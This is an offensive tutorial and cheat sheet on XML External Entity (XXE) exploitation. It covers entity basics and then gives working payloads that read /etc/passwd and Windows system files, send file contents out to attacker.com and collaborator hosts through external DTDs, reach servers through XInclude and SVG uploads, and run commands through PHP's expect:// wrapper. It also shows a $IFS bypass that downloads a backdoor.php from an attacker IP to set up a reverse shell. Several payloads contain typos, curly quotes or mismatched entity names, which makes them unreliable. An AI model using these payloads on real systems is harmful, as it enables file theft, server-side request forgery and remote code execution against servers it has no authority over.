# Mastering XXE Exploitation

## ENTITY

#### 1.Internal Entity

   ##### Definition:  	

   XML allows custom entities to be defined within the DTD.


```python
<!ENTITY entityname "Hello">
<!ENTITY entityname2 'World'>
```
##### Usage:

```python
<sample>I would like to say &entityname; &entityname2;</sample>
```
##### Output:

```python
<sample>I would like to say Hello World</sample>
````


#### 2. External Entity

   ##### Definition:


   XML external entities are a type of custom entity whose definition is located outside of the DTD where they are declared.The declaration of an external entity uses the SYSTEM    keyword and must specify a URL from which the value of the entity should be loaded.

```python
<!ENTITY includeme SYSTEM "include.xml">
<!ENTITY includeme2 SYSTEM "http://attackerserver/include.xml">
```

Usage:

```python
<sample>
    <head>Header</head>
    <first>&includeme;</first>
    <second>&includeme2;</second>
</sample>
```

include.xml:

```python
<body>I am to be included.</body>
```
Output:

```python <sample>
    <head>Header</head>
    <first><body>I am to be included.</body></first>
    <second><body>I am to be included.</body></second>
</sample>
```


## XXE Testing

##### Basic Payload
```python
<!DOCTYPE test [<!ENTITY ent "test"> ]>
<root>&ent;</root>
```
output:

```python
<root>test</root>`
```

##### Payload to fetch internal files

```python
<!DOCTYPE test [<!ENTITY ent SYSTEM "file:///etc/passwd"> ]>
```

```python

		 |--> This declaration introduces Document Type Definition, it declares the root element of the document named test
 		 |
		 |
		 |          |--> This is name of the document type or root element
		 |          |
 		 |          |       |--> (Entity declaration or Entity defination)  is used to define named entities which are place holders 
  		 |          |       |     for the text that can be reused within the document it defines an entity named ent 
 		 |          |       |
		 |          |       |
	     <!DOCTYPE test [<!ENTITY ent SYSTEM "file:///etc/passwd"> ]>
 		  <userInfo>                               |
 		<firstName>John</firstName>                |
                <lastName>&ent;</lastName>         |--> external content such as url's or files
		 </userInfo>         |
		                     |
				             | --> This is Actual xml content

```

## SYSTEM vs PUBLIC

 *  As indicated by the name, the SYSTEM Entities are intended to be for files locally stored on the machine.
 *  whereas PUBLIC are for contents accessible from the internet, PUBLIC Entities need an identifier (here: 'm') but the value of the identifier does not matter.

 *  The protocol. Depending on the parser (the programming language), it is possible to use the absolute path of a file, or to use the file:// protocol. Most parsers additionally understand the http:// and https:// handler and, for instance, Java also allows to use jar:// protocol (which basically allows to unzip files). 

   ```python
     <!ENTITY msg SYSTEM '/etc/hostname'>
    <!ENTITY msg SYSTEM 'file:///etc/hostname'>
    <!ENTITY msg SYSTEM 'http:///myserver.com/something'>
   <!ENTITY msg PUBLIC 'm' '/etc/hostname'>
  <!ENTITY msg PUBLIC 'm' 'file:///etc/hostname'>
    <!ENTITY msg PUBLIC 'm' 'http:///myserver.com/something'>

```
![image](https://github.com/user-attachments/assets/d4e0897b-481a-450b-bc61-d4a83b27be3c)


## Parameter Entities 
   Parameter entities in XML are used within DTDs (Document Type Definitions) and are different from general entities, which are used in the XML content itself. Parameter entities are primarily used for defining reusable content or DTD fragments and help in structuring DTDs in a modular way.





### What Are Parameter Entities?

  * Parameter entities are declared with a `%` character, followed by the entity name, and are used in DTDs (not in the XML document body).
  * They are typically employed to include reusable DTD fragments or configuration within the DTD.
  * To reference a parameter entity, you need to use `%entityName;` inside the DTD.





### Syntax for Declaring Parameter Entities



```python
<!ENTITY % entityName "replacement text or value">
```

* `%entityName;` will be replaced with "replacement text or value" wherever it is referenced in the DTD.




### Examples of Parameter Entities

#### 1. Basic Parameter Entity Usage


```python
<!DOCTYPE root [
   <!ENTITY % greeting "Hello, World!">
   <!ELEMENT root (#PCDATA)>
]>
<root>%greeting;</root>
```

In this example:
* The DTD defines a parameter entity named `greeting` with the value "Hello, World!".
* However, this example is incorrect in practice because `%greeting;` cannot be used directly in the XML document content.

To use the parameter entity, you need to declare an additional general entity:


```python
<!DOCTYPE root [
   <!ENTITY % greeting "Hello, World!">
   <!ENTITY myGreeting "%greeting;">
   <!ELEMENT root (#PCDATA)>
]>
<root>&myGreeting;</root>
```

* Here, `myGreeting` is a general entity that uses the value of the parameter entity `%greeting`.

<!DOCTYPE test [
<!ENTITY % parameter_entity "<!ENTITY general_entity 'pwnfunction'>">
%parameter_entity;
]>

<pwn>&general_entity;</pwn>



Parameter entity reference must not occur with in markup declarations, this doesn't apply to external parameter entity or dtd  

```
 <!ENTITY % ent "<!ENTITY send SYSTEM 'http://attacker.com/?%test;'>">

```


##### evil.dtd

```
<!ENTITY % test SYSTEM "file://etc/passwd">
<!ENTITY % ent "<!ENTITY send SYSTEM 'http://attacker.com/?%test;'>">
%wrapper;

```

##### main.xml
```
<!DOCTYPE data SYSTEM "http://attacker.com/evil.dtd">
<data>&send;</data>
```

##### CDATA

EXternal entity

```
<!ENTITY % file SYSTEM "file:///etc/fstab">
<!ENTITY % start "<![CDATA[">
<!ENTITY % end "]]>">
<!ENTITY % wrapper "<!ENTITY ALL '%start;%file;%end;'>">
%wrapper;
```


#### 2. Including an External DTD Using Parameter Entities
You can use parameter entities to include external DTDs, making the DTD modular and easier to maintain.


#### External DTD (`common.dtd`):


```python
<!ENTITY % commonElements "<!ELEMENT greeting (#PCDATA)>">
```


#### Main XML File:


```python
<!DOCTYPE root [
   <!ENTITY % common SYSTEM "http://example.com/common.dtd">
   %common;
   %commonElements;
]>
<root>
   <greeting>Hello from an external DTD!</greeting>
</root>
```


In this example:
* The parameter entity `%common` references an external DTD file located at `http://example.com/common.dtd`.
* `%commonElements;` is used to insert the content from the external DTD (in this case, an element declaration).





## 3. Conditional DTD Sections Using Parameter Entities
Parameter entities can be used to include or exclude parts of a DTD based on conditional sections.


```python
<!DOCTYPE root [
   <!ENTITY % includeGreeting "INCLUDE">
   <![%includeGreeting;[
      <!ELEMENT greeting (#PCDATA)>
   ]]>
   <!ELEMENT root (greeting)>
]>
<root>
   <greeting>Conditional Greeting Example</greeting>
</root>
```


In this example:
* The `%includeGreeting` parameter entity determines whether the `greeting` element is included.
* The conditional section `<![%includeGreeting;[ ... ]]>` is included because `%includeGreeting` is set to "INCLUDE".




## Security Implications of Parameter Entities

1. #### XML External Entity (XXE) Attacks 

Parameter entities can be used to reference external files or resources, leading to XXE vulnerabilities if the XML parser is not configured securely


```python
<!DOCTYPE root [
   <!ENTITY % file SYSTEM "file:///etc/passwd">
   <!ENTITY % eval "<!ENTITY exfil SYSTEM 'http://attacker.com/?data=%file;'>">
   %eval;
]>
<root>&exfil;</root>
```

In this XXE example, an external file `(/etc/passwd)` is accessed and sent to an attacker's server.




2. #### Entity Reference Loops
   
   Defining parameter entities that reference each other in a circular manner can cause infinite loops:


```python
<!ENTITY % loop "%loop;">
```

This will trigger a "detected an entity reference loop" error in most XML parsers.





## Differences Between Parameter Entities and General Entities

|        Feature               |            Parameter Entities                            |    General Entities
|------------------------------|:---------------------------------------------------------|--------------------------------------------------------------:
|  Declared with               |         `%` (e.g., `<!ENTITY % name "value">`)           |           None (e.g., `<!ENTITY name "value">)`
|  Usage Scope                 |                Within DTDs only                          |             In XML document content
|  Syntax for Reference        |                `%name;`                                  |   `&name;`
|  Typical Use Cases           |         Including DTD fragments,conditional DTD sections |             Embedding content in XML 
|  Security Considerations     |         Can lead to XXE or loops if misconfigured        |                Rarely used for file access






## Summary
Parameter entities are a powerful feature in XML DTDs that help in reusing and modularizing DTD content. However, they must be used with caution due to the security risks associated with external entities and potential loops. Proper configuration of XML parsers and secure handling of DTDs is crucial to avoid XXE vulnerabilities.


## Internal Subset problem

Supposed a developer would like to wrap around a parameter entity as follows:

```python
<!DOCTYPE document [
	<!ENTITY % sample "hello world">
 	<!ENTITY wrapped "<body>%sample;</body>" >
]>
<document>&wrapped;</document>
```


The above would face an error "`XMLSyntaxError: PEReferences forbidden in internal subset`".

## In order to use a parameter entity in an entity's value, an external entity has to be used.

* external.dtd:

```python
<!ENTITY wrapped "<body>%sample;</body>" >
```

* document.xml:

```python
<!DOCTYPE document [
	<!ENTITY % sample "hello world">
 	<!ENTITY % dtd SYSTEM "external.dtd">
	%dtd;
]>
<document>&wrapped;</document>
```
* Output:

```python
<document><body>hello world</body></document>
```

### First match matters

Given the following definition and body:

```python
<!DOCTYPE r [
 <!ENTITY a "one" >
 <!ENTITY a "two" >
 <!ENTITY % param '<!ENTITY a "three">'>
 %param;
]>
<Sample> &a; </Sample>
```

* Output:

```python
<Sample> one </Sample>
```
When an entity is defined more than once, the XML parser will assume the first match and drop the remaining.


### limitations :-

*  XXE can only be used to obtain files or responses that contain “valid” XML or text.
* It is difficult to exfiltrate plain text files that are not valid XML files (e.g. files that contain XML special characters such as &, < and >)

* `CDATA` - used to make the XML parser interpret contents as text data and not as markup

## CDATA Enters the chat

* In the case of "<", this is due to parser scanning for the start of an XML node. If the content does not form a proper XML node, the parser would raise exceptions like "lxml.etree._raiseParseError XMLSyntaxError: chunk is not well balanced". A well-form XML <test></test> would not face such error.

* In the case of "&", this is due to parser scanning for an entity's name. Without a proper entity syntax, the parser would raise exceptions like "lxml.etree._raiseParseError XMLSyntaxError: xmlParseEntityRef: no name". A well-formed XML entity syntax like &gt; would not face such error.

* If the file content can be surround by <![CDATA[ and ]]> , the file content can be retrievable.

* This requires a wrapper and the knowledge of the Internal Subset Problem comes to our rescue.

* However, if the length of the file with illegal characters is too large, XML parser will attempt to throw "XMLSyntaxError: Detected an entity reference loop" as it attempts to stop billion laughter attacks.



## CDATA VS PCDATA



* All text in an XML document will be parsed by the parser,But text inside a CDATA section will be ignored by the parser.


### PCDATA - Parsed Character Data


 * XML parsers normally parse all the text in an XML document.

* When an XML element is parsed, the text between the XML tags is also parsed

* The parser does this because XML elements can contain other elements, as in this example, where the <name> element contains two other elements (first and last)

  ```python
  
	<?xml version="1.0"?>  
	<!DOCTYPE employee SYSTEM "employee.dtd">  
	<employee>  
  	<firstname>vimal</firstname>  
  	<lastname>jaiswal</lastname>  
  	<email>vimal@javatpoint.com</email>  
	</employee>  
  ```
In the above example, the employee element contains 3 more elements 'firstname', 'lastname', and 'email', so it parses further to get the data/text of firstname, lastname and email to give the value of employee as:


  ```javascript

	vimal jaiswal vimal@javatpoint.com
```

Parsed Character Data (PCDATA) is a term used about text data that will be parsed by the XML parser. 


### CDATA - (Unparsed) Character Data


* The term CDATA is used about text data that should not be parsed by the XML parser.Characters like "<" and "&" are illegal in XML elements.

* "<" will generate an error because the parser interprets it as the start of a new element."&" will generate an error because the parser interprets it as the start of an character entity.

* Some text, like JavaScript code, contains a lot of "<" or "&" characters. To avoid errors script code can be defined as CDATA.

* Everything inside a CDATA section is ignored by the parser.

* A CDATA section starts with "<![CDATA[" and ends with "]]>":

  ```javascript

  <<?xml version="1.0"?>  
	<!DOCTYPE employee SYSTEM "employee.dtd">  
	<employee>  
	<![CDATA[  
  <firstname>vimal</firstname> 
  <lastname>jaiswal</lastname> 
  <email>vimal@javatpoint.com</email> 
	]]>   
	</employee> 

In the above CDATA example, CDATA is used just after the element employee to make the data/text unparsed, so it will give the value of employee:
```javascript

<firstname>vimal</firstname><lastname>jaiswal</lastname><email>vimal@javatpoint.com</email>
```

#### NOTE

   A CDATA section cannot contain the string "]]>". Nested CDATA sections are not allowed.

   The "]]>" that marks the end of the CDATA section cannot contain spaces or line breaks. 


## Hidden Attack surface 

 Attack surface for XXE injection vulnerabilities is obvious in many cases, because the application's normal HTTP traffic includes requests that contain data in XML format. In other cases, the attack surface is less visible. However, if you look in the right places, you will find XXE attack surface in requests that do not contain any XML. 

 

 ### 1.   When XML is hidden & only parameters are used (Xinclude)

   Some applications receive client-submitted data, embed it on the server-side into an XML document, and then parse the document. An example of this occurs when client-submitted data is placed into a back-end SOAP request, which is then processed by the backend SOAP service.

In this situation, you cannot carry out a classic XXE attack, because you don't control the entire XML document and so cannot define or modify a DOCTYPE element. However, you might be able to use XInclude instead. XInclude is a part of the XML specification that allows an XML document to be built from sub-documents. You can place an XInclude attack within any data value in an XML document, so the attack can be performed in situations where you only control a single item of data that is placed into a server-side XML document.

To perform an XInclude attack, you need to reference the XInclude namespace and provide the path to the file that you wish to include.

   ```XML

	<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>
 ```


 
### 2.   XXE Via File upload (SVG/docx) :-

Some applications allow users to upload files which are then processed server-side. Some common file formats use XML or contain XML subcomponents. Examples of XML-based formats are office document formats like DOCX and image formats like SVG.

For example, an application might allow users to upload images, and process or validate these on the server after they are uploaded. Even if the application expects to receive a format like PNG or JPEG, the image processing library that is being used might support SVG images. Since the SVG format uses XML, an attacker can submit a malicious SVG image and so reach hidden attack surface for XXE vulnerabilities. 



```XML
<?xml version="1.0" standalone="yes"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]><svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-size="16" x="0" y="16">&xxe;</text></svg>

```



### 3.   Modified content type : -

   Most POST requests use a default content type that is generated by HTML forms, such as application/x-www-form-urlencoded. Some web sites expect to receive requests in this format but will tolerate other content types, including XML. 

```python
        POST /action HTTP/1.0
   	Content-Type: application/x-www-form-urlencoded
   	Content-Length: 7

    	foo=bar
```

```python
   	POST /action HTTP/1.0
   	Content-Type: text/xml or Content-Type: application/xml;charset=UTF-8
  	Content-Length: 52

  	<?xml version="1.0" encoding="UTF-8"?><foo>bar</foo>
```



# OUT OF BAND XXE 

when no parameter

```python
<?xml version="1.0" ?>
<!DOCTYPE root [
<!ENTITY % ext SYSTEM "http://59c99fu65h6mqfmhf5agv1aptgz6nv.burpcollaborator.net/x"> %ext;
]>
<r></r>
```
```python

	POST /netspi HTTP/1.1
	Host: someserver.netspi.com
	Accept: application/json
	Content-Type: application/xml
	Content-Length: 139

	<?xml version="1.0" encoding="UTF-8" ?>
	<!DOCTYPE foo SYSTEM "https://xxe.netspi.com/netspi.dtd">
	<root>
	<search>name</search>
	</root>
```
```python

                                POST /action HTTP/1.0
                                Content-Type: text/xml
                                Content-Length: 52

                                 <?xml version="1.0" encoding="UTF-8"?>
				 <foo>bar</foo>
     				<username>test</username>
	 			<password>test</password>
     				<XMLdata><![CDATA[<!DOCTYPE r [ <!ENTITY % aplha SYSTEM "http://test.com/data.xml" > %alpha %bravo; %charlie;]><r>1</r>]]></XMLdata>
```


* data.XML
```python

		<!ENTITY % charlie SYSTEM "file:///c:/windows/win.ini">
		<!ENTITY % bravo "<!ENTITY &#X25; delta SYSTEM 'http://test.com/xxe?%charlie;'>">
```


![image](https://github.com/user-attachments/assets/fac143af-70e2-465f-ad51-9b7ca5abdbb0)


####The basic Idea looks as follows:

```python    <!DOCTYPE Message [
    <!ENTITY file SYSTEM "/etc/hostname">
    <!ENTITY send SYSTEM "http://attacker.com/?read=&file;">
    ]>
    <Message>&send;</Message>
```

* The code above does not work directly.
* This is due to the fact, that External Entities must not be included in other External Entities. This means, that most parsers will abort the DTD processing on finding the file Entity within the send Entity declaration.

Nevertheless, another DTD feature called Parameter Entities exists that allows to bypass this restriction.
```python
    <!DOCTYPE Message [
      <!ENTITY % file SYSTEM 'file:///etc/hostname'>
      <!ENTITY % dtd SYSTEM 'http://attacker.com/mydtd'>
    %dtd;]>
    <Message>&send;</Message>
```
* The above content is then Base64 plus URL-encoded and sent to the SAML-Endpoint URL of the Web Application. Please note, that the Entity send within the <Message> Element is not directly defined in the DTD. It will be defined in the DTD that is loaded from 'http://attacker.com/mydtd' later on.

* The Parameter Entities look similar to common Entities but start with a percentage character (%). They can be seen as a Meta Language for DTD (comparable to #DEFINE instructions in C/C++).
  
* The Web Application processes the DTD as follows:

The parser processes the first Parameter Entity % file, thus reading the content of the /etc/hostname system resource.
It then processes the second Parameter Entity % dtd.
This one enforces the parser to load an External DTD that is provided by the attacker's HTTP server.

Server responds with:
```python
    <?xml version="1.0" encoding="UTF-8"?>
    <!ENTITY % all "<!ENTITY send SYSTEM 'http://attacker.com/send/%file;'>">
    %all;
```
* This file is immediately parsed and processed.It defines a Parameter Entity % all that declares an Entity send.
* The send Entity is an External Entity pointing again to the attacker's server. The URL Request contains the content of the file Parameter Entity.
* The last line contains only "%all;". This means, that at this place, the content of the %all Entity will be placed. This is the declaration of the send Entity.
* The last line of the attacker's request contains "%dtd;" - this means, that at this place, the content of the the File
'http://attacker.com/mydtd' will be placed.
* This is (again) the declaration of the send Entity.
Once the Web Application processes the line "<Response>&send;</Response>",  the GET Request 'http://attacker.com/send/%file;' is executed and the attacker receives the content of the
    '/etc/hostname' file.




### SSRF

![image](https://github.com/user-attachments/assets/4d87f9d3-0ce3-4710-9116-99523e49c72c)

![image](https://github.com/user-attachments/assets/8fec6433-da91-4296-8dfc-a0345ae37a27)



### PHP Remote Code Execution

* If fortune is on our side, and the PHP “expect” module is loaded, we can get RCE.
```python
  <?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [ <!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "expect://id" >]>
<creds>
    <user>&xxe;</user>
    <pass>mypass</pass>
</creds>
```

The response from the server will be something like:

```python
You have logged in as user uid=0(root) gid=0(root) groups=0(root)
```

Instances where RCE is possible via XXE are rare, 

```python

(<!ENTITY rce SYSTEM “expect://ifconfig” >).
```

The idea is that you provide a reference to ```expect://id``` pseudo URI for the XML external entity, and PHP will execute ``id`` and return the output of the command for external entity substitution.

Turns out it was quite a lot of work to get from that to a “useful” code execution. The problem is, PHP’s XML parser will error out if you have spaces in the expect pseudo URI, i.e. when providing arguments for the command. You might see something like this in the error log when trying ```expect://echo BLAH:```

```python
DOMDocument::loadXML(): Invalid URI: expect://echo BLAH in Entity, line: 2
```

Firstly, in addition to spaces, the following characters will be rejected with the “Invalid URI” error message similar to above (this might not be an exhaustive list):

```python
" - double quotes
{ } - curly braces
| - "pipe"
\ - backslash
< > - angle brackets
: - colon
```
```python
The following characters work fine:

' - single quote
; - semicolon
( ) - brackets
$ - dollar sign
```
This makes it hard to pass arguments to commands, redirect output, or use shell pipes.

When constructing ``expect://`` pseudo URLs for external entity reference in XML you shouldn’t URL encode the string (it is interpreted literally). So using %20 or + instead of space doesn’t work, and neither does XML encoding like ``&#x20;`` or ``&#32;``.

One workaround that `$IFS` built-in variable in sh and relies on the fact that the dollar sign is accepted. The core technique is to replace any spaces in your command with `$IFS`. In some cases this needs to be combined with the use of single quotes when a space needs to be followed by alphanumeric characters (so that they are not interpreted as a part of the variable name). Here’s a couple examples:

``cat /tmp/BLAH becomes cat$IFS/tmp/BLAH``

``echo BLAH`` becomes ``echo$IFS'BLAH'``

`curl -O http://1.3.3.7/BLAH` becomes `curl$IFS-O$IFS'1.3.3.7/BLAH'`
(: would not be allowed, but curl assumes it is http if you omit http://)

Using these, a possible way to get a reverse shell using XXE would be to upload a PHP reverse shell and then execute it using your browser. (replace 1.3.3.7 with your IP and serve backdoor.php using `python3 -m http.server`

```python
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
  <!ENTITY file SYSTEM "expect://curl$IFS-O$IFS'1.3.3.7:8000/backdoor.php'">
]>
<root>
  <name>Joe</name>
  <tel>ufgh</tel>
  <email>START_&file;_END</email>
  <password>kjh</password>
</root>
```






# later


### classic XXE

formatting.dtd:
```python

	<!DOCTYPE STRUCTURE [
<!ELEMENT SPECIFICATIONS (#PCDATA)>
<!ENTITY VERSION “1.1”>
<!ENTITY file SYSTEM “file:///c:/server_files/application.conf” >
]>

```

```python

	<?xml version=”1.0″ encoding=”UTF-8″?>
<!DOCTYPE foo SYSTEM “http://validserver.com/formatting.dtd”>
<specifications>&file;</specifications>

```

## ERROR Based XXE

```python

	<!ENTITY % payload SYSTEM “file:///etc/passwd”>
<!ENTITY % param1 ‘<!ENTITY % external SYSTEM “file:///nothere/%payload;”>’> %param1; %external;

```


## BYPASS

###  Special Characters and Linefeed

For the exploit phase, the attacker has to chose which file he wants to read. We tried different ones. Most popular is reading the '/etc/passwd' file.
However, this file might include whitespaces, linefeeds and special characters.
Depending on the target Web Application and its XML parser, the file can cause problems. For example, within the GET request, they can break the parsing process, or characters like '<' can produce invalid XML, so that it is not parseable.

Thus, we prefer to use the file ``` '/etc/hostname'```  for testing purposes.

In PHP, there is a nice possibility to read arbitrary files by encoding it directly with Base64:

```python
    <!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd" >
 ```


###  Load Balancers

We could detect a strange behavior on some Web Applications.
We sent several XXEA messages to them and tried to read the '/etc/hostname' file. It failed in some cases, but in other tries it was successful.

This is due to the fact, that the Web Application was behind a load balancer that deligates the requests to different servers.
On some of them, the '/etc/hostname' file exists, on other, it doesn't. This is, for example, the case for CentOS Servers.


